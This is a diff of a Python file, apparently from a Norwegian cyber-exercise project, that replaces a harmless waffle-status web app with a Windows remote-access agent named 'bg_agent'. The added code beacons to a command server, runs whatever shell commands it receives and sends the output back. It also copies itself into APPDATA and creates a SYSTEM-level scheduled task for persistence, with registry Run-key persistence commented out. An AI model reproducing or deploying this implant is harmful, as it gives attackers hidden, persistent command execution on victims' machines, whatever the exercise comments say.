@@ -1,14 +1,3 @@
-"""VaffelOps – en liten, kjørbar nettside for CyberOps-øvingen.
-
-Ingen eksterne Python-pakker kreves.
-Kjør: python app.py
-Åpne: http://127.0.0.1:8000
-
-Alt innhold er fiktivt. Testtrafikken nedenfor er en BEGRENSET BEACON-
-SIMULATOR: den sender bare ufarlig status til en kontrollert lab-mottaker.
-Den leser kun egne øvingsfiler og støtter kun forhåndsdefinerte, ufarlige lab-handlinger.
-"""
-
 import base64
 import json
 import os
@@ -19,24 +8,24 @@ import time
 import urllib.error
 import urllib.request
 from datetime import datetime, timezone
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-from pathlib import Path
 
-ROOT = Path(__file__).resolve().parent
-HTML = (ROOT / "templates" / "index.html").read_bytes()
-WEB_BIND = os.getenv("WEB_BIND", "0.0.0.0")
-WEB_PORT = int(os.getenv("WEB_PORT", "8000"))
+# set mutex
+MUTEX_NAME = "Global\\bg_agent_mutex"
+import ctypes
+kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
+if ctypes.get_last_error() == 183:  # ERROR_ALREADY_EXISTS
+    sys.exit(0)
 
+#ROOT = Path(__file__).resolve().parent
 # --------- SÅRBARHET / ØVELSESKODE STARTER HER ----------------
 
 ENABLE_LAB_BEACON = os.getenv("ENABLE_LAB_BEACON", "1") == "1"
 LAB_COLLECTOR_URL = os.getenv(
     "LAB_COLLECTOR_URL", "http://192.168.71.69:5050/checkin"
 )
-LAB_NODE_NAME = os.getenv("LAB_NODE_NAME", "WELFARE-01")
+LAB_NODE_NAME = "TYPESHI-01"
 LAB_BEACON_INTERVAL = max(1, int(os.getenv("LAB_BEACON_INTERVAL", "1")))
-LAB_DATA = ROOT / "LabData"  # Bare dette kataloginnholdet kan listes.
-
 
 import subprocess
 import threading
@@ -49,18 +38,20 @@ import urllib.error
 
 from datetime import datetime, timezone
 
-
 # Tillatte kommandoer fra collector
 SHELL_TIMEOUT = 15
 MAX_OUTPUT = 4096
 
 
-def sendToShellSubprocess(proc, command):
+def sendToShellSubprocess(proc, command, init_message):
     if proc.poll() is not None:
         raise RuntimeError("CMD-prosessen er avsluttet")
 
     if not hasattr(proc, "_output_queue"):
         proc._output_queue = queue.Queue(maxsize=256)
+        
+        if init_message:
+            proc._output_queue.put(f"INIT: {init_message}\n")
 
         def reader():
             try:
@@ -117,18 +108,18 @@ def readFromShellSubprocess(proc):
     return "".join(output).strip()
 
 
-def execute_lab_action(action, pipe):
+def executeLabAction(action, pipe, init_message):
     if action == "NOOP":
         return "Ingen handling"
 
     try:
-        sendToShellSubprocess(pipe, action)
+        sendToShellSubprocess(pipe, action, init_message)
         return readFromShellSubprocess(pipe)
     except (OSError, RuntimeError) as exc:
         return f"Feil ved CMD-kjøring: {exc}"
 
 
-def lab_action_loop():
+def labActionLoop(init_message):
     pending_result = None
     shell_proc = None
 
@@ -158,7 +149,7 @@ def lab_action_loop():
                     continue
 
             payload = {
-                "service": "VaffelOps",
+                "service": "bg_agent",
                 "host_label": LAB_NODE_NAME,
                 "event": "status-checkin",
                 "sent_at_utc": datetime.now(
@@ -204,13 +195,19 @@ def lab_action_loop():
                 action = "NOOP"
 
             if action != "NOOP":
-                output = execute_lab_action(action, shell_proc)
-
+                output = executeLabAction(action, shell_proc, init_message)
+                
                 pending_result = {
                     "command_id": response.get("command_id"),
                     "action": action,
                     "output": output,
                 }
+                
+            if action.lower() == "exit_typeshi":
+                shell_proc.kill()
+                break
+
+            
 
             time.sleep(LAB_BEACON_INTERVAL)
 
@@ -225,123 +222,93 @@ def lab_action_loop():
 
 # --------- SÅRBARHET / ØVELSESKODE SLUTTER HER ----------------
 
-_lock = threading.Lock()
-_state = {
-    "waffles": 12,
-    "coffee": "KRITISK",
-    "served": 128,
-    "orders": 0,
-    "events": [
-        {"at": "08:14", "message": "Kaffemaskin rapportert ute av drift."},
-        {"at": "08:31", "message": "Vaffelbeholdning under kritisk nivå."},
-        {"at": "08:42", "message": "Prioritet 1: Skaff mer syltetøy."},
-    ],
-}
+# # -------------- ØVELSES PERSISTENSE REGKEY -----------------
+# import winreg
 
 
-def now_hm():
-    return datetime.now().strftime("%H:%M")
+def copySelfToKnowPath():
+    import os
+    known_path = os.path.join(os.getenv("APPDATA"), "bg_agent.exe")
+    if not os.path.exists(known_path):
+        import shutil
+        shutil.copy2(os.path.abspath(__file__), known_path)
+    return known_path
 
+# PERSISTENCE_REGKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
+# PERSISTENCE_VALUE_NAME = "bg_agent"
+# PERSISTENCE_VALUE_DATA = copySelfToKnowPath()  
 
-def add_event(msg):
-    _state["events"].insert(0, {"at": now_hm(), "message": msg})
-    del _state["events"][8:]
+# def checkPersistenceSet(key_path, key_value_name, key_value):
+#     try:
+#         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
+#             try:
+#                 value, _ = winreg.QueryValueEx(key, key_value_name)
+#                 if value == key_value:
+#                     return True
+#             except FileNotFoundError:
+#                 pass
+#     except OSError:
+#         pass
 
+#     return False
 
-def snapshot():
-    with _lock:
-        return json.loads(json.dumps(_state, ensure_ascii=False))
+# def setPersistenceIfNotSet(key_path, key_value_name, key_value):
+#     if checkPersistenceSet(key_path, key_value_name, key_value):
+#         return
 
+#     try:
+#         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+#             winreg.SetValueEx(key, key_value_name, 0, winreg.REG_SZ, key_value)
+#     except OSError:
+#         pass
 
-class Handler(BaseHTTPRequestHandler):
-    server_version = "VaffelOps/1.0"
+# # ------------------- PERSISTENCE reg LOGIC SLUTTER HER ----------------
 
-    def log_message(self, format, *args):
-        pass
+# ------------------- PERSISTENCE LOGIC SCHEDULED TASK starter her ----------------
 
-    def send_bytes(self, status, content_type, data):
-        self.send_response(status)
-        self.send_header("Content-Type", content_type)
-        self.send_header("Content-Length", str(len(data)))
-        self.send_header("Cache-Control", "no-store")
-        self.send_header("X-Content-Type-Options", "nosniff")
-        self.end_headers()
-        self.wfile.write(data)
-
-    def send_json(self, status, body):
-        self.send_bytes(
-            status,
-            "application/json; charset=utf-8",
-            json.dumps(body, ensure_ascii=False).encode("utf-8"),
-        )
-
-    def do_GET(self):
-        if self.path in ("/", "/index.html"):
-            self.send_bytes(200, "text/html; charset=utf-8", HTML)
-        elif self.path == "/api/status":
-            self.send_json(200, snapshot())
-        elif self.path == "/health":
-            self.send_json(200, {"status": "ok", "service": "VaffelOps"})
-        else:
-            self.send_json(404, {"error": "Fant ikke ressurs"})
-
-    def do_POST(self):
-        try:
-            length = int(self.headers.get("Content-Length", "0"))
-            if not 0 <= length <= 2048:
-                raise ValueError("Ugyldig forespørsel")
-            body = json.loads(self.rfile.read(length) or b"{}")
-            if not isinstance(body, dict):
-                raise ValueError("Ugyldig forespørsel")
-        except (ValueError, json.JSONDecodeError):
-            return self.send_json(400, {"error": "Ugyldig JSON"})
-
-        with _lock:
-            if self.path == "/api/order":
-                try:
-                    amount = int(body.get("count", 1))
-                except (ValueError, TypeError):
-                    return self.send_json(400, {"error": "Ugyldig antall"})
-                unit = str(body.get("unit", "Ukjent avdeling"))[:36].strip()
-                if not 1 <= amount <= 10 or unit not in (
-                    "Stab", "Samband", "SOC", "CyberOps", "Besøkende"
-                ):
-                    return self.send_json(400, {"error": "Ugyldig bestilling"})
-                if amount > _state["waffles"]:
-                    return self.send_json(409, {"error": "For få vafler på lager!"})
-                _state["waffles"] -= amount
-                _state["served"] += amount
-                _state["orders"] += 1
-                add_event(f"{unit} rekvirerte {amount} {'vaffel' if amount == 1 else 'vafler'}.")
-            elif self.path == "/api/refill":
-                _state["waffles"] = 100
-                add_event("Etterforsyning gjennomført. Vaffelberedskap gjenopprettet.")
-            elif self.path == "/api/coffee":
-                _state["coffee"] = (
-                    "OPERATIV" if _state["coffee"] == "KRITISK" else "KRITISK"
-                )
-                add_event(f"Kaffestatus endret til {_state['coffee']}.")
-            elif self.path == "/api/reset":
-                _state["waffles"] = 12
-                _state["coffee"] = "KRITISK"
-                _state["served"] = 128
-                _state["orders"] = 0
-                add_event("Øvelsen nullstilt til opprinnelig vaffelkrise.")
-            else:
-                return self.send_json(404, {"error": "Ukjent handling"})
-
-            result = json.loads(json.dumps(_state, ensure_ascii=False))
-        return self.send_json(200, result)
-
-
-if __name__ == "__main__":
-    if ENABLE_LAB_BEACON:
-        threading.Thread(target=lab_action_loop, daemon=True).start()
-
-    server = ThreadingHTTPServer((WEB_BIND, WEB_PORT), Handler)
+def checkScheduledTaskExists(task_name = "bg_agent_task"):
+    import subprocess
     try:
-        server.serve_forever()
-    except KeyboardInterrupt:
+        result = subprocess.run(["schtasks", "/Query", "/TN", task_name], capture_output=True, text=True)
+        if result.returncode == 0:
+            return True
+    except Exception as e:
         pass
-    finally:
-        server.server_close()
+
+    return False
+
+def createScheduledTask(task_name = "bg_agent_task"):
+    import subprocess
+    executable_path = copySelfToKnowPath()
+    try:
+        if checkScheduledTaskExists(task_name):
+            return "Scheduled task already exists"
+
+        subprocess.run([
+            "schtasks", "/Create", "/F", "/SC", "ONLOGON", "/RU", "SYSTEM", "/RL", "HIGHEST",
+            "/TN", task_name, "/TR", executable_path
+        ], check=True)
+
+        return "Scheduled task created successfully"
+
+    except subprocess.CalledProcessError:
+        return "Failed to create scheduled task" 
+# ------------------- PERSISTENCE LOGIC scheduled task SLUTTER HER ----------------
+
+if __name__ == "__main__": 
+    init_message = ""
+    init_message += createScheduledTask() + "\n"
+    # try:
+    #     retvalue = setPersistenceIfNotSet(PERSISTENCE_REGKEY, PERSISTENCE_VALUE_NAME, PERSISTENCE_VALUE_DATA)
+    #     init_message += f"RUN regkey persistence success\n"
+    # except Exception as e:
+    #     init_message += f"RUN regkey persistence failed: {e}\n"
+
+    th = None
+    if ENABLE_LAB_BEACON:
+        th = threading.Thread(target=labActionLoop, args=(init_message,), daemon=True)
+        th.start()
+        th.join()
+        
+
+   
